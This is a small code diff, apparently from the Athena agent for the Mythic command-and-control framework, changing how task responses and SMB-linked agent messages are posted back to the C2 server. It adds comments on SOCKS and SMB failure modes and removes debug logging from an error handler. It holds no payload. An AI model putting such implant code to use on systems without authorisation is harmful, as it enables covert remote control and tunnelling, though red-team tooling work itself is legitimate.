@@ -283,6 +283,7 @@ namespace Athena
                         break;
                 };
             }
+
             PostResponseResponse prr = new PostResponseResponse()
             {
                 action = "post_response",
@@ -291,6 +292,12 @@ namespace Athena
                 delegates = Globals.mc.MythicConfig.smbConfig.GetMessages(),
             };
 
+
+            //Things that will likely break in the event this function fails at the wrong time
+            //Socks communications - new connections will still be accepted
+            //SMB Comms - Will likely cause the death of the SMBClient
+            //Uploads/Downloads(?) - these can be restarted easily
+            //Tasks will likely be fine
             try
             {
                 var responseString = this.MythicConfig.currentConfig.Send(prr).Result;
@@ -416,7 +423,6 @@ namespace Athena
             }
             catch (Exception e)
             {
-                Misc.WriteDebug(e.Message);
                 return false;
             }
             return true;
